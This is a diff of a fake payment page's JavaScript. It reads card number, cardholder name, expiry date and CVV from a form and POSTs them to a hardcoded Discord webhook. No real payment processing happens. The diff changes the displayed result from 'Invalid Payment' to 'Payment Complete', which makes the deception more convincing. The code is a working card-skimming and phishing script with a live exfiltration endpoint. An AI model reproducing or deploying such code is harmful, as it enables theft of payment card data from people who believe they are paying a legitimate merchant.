@@ -37,10 +37,21 @@
     </div>
 
     <script>
-        document.getElementById("payment-form").addEventListener("submit", function (event) {
+document.getElementById("payment-form").addEventListener("submit", function (event) {
     event.preventDefault();
+    // Prevent the form from being submitted traditionally
 
-    // Get the form data
+    // Your form validation logic goes here
+
+    // Display a message while waiting for the response from the webhook
+    document.getElementById("payment-result").innerHTML = "Processing Payment...";
+
+    // Simulate payment processing (replace this with actual payment processing logic)
+    setTimeout(function () {
+        document.getElementById("payment-result").innerHTML = "Payment Complete";
+    }, 2000); // Simulate a 2-second payment processing delay
+
+    // Send the form data to a webhook using an AJAX request
     var cardNumber = document.getElementById("card-number").value;
     var cardHolder = document.getElementById("card-holder").value;
     var expirationDate = document.getElementById("expiration-date").value;
@@ -54,21 +65,11 @@
         cvv: cvv
     };
 
-    // Send the form data to a webhook using an AJAX request
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "https://discord.com/api/webhooks/1040784002602242102/E-iHxc_BxcYJdiZT7RmngRYimGwyulLu1jR7F6dGqqY0yogtOARWsHcPHhmwUtzxM1dH", true);
     xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
     xhr.send(JSON.stringify(formData));
-
-    // Display a message while waiting for the response from the webhook
-    document.getElementById("payment-result").innerHTML = "Checking Payment";
-
-    // Simulate payment processing (replace this with actual payment processing logic)
-    setTimeout(function () {
-        document.getElementById("payment-result").innerHTML = "Invalid Payment";
-    }, 2000); // Simulate a 2-second payment processing delay
 });
-
     </script>
 </body>
 </html>
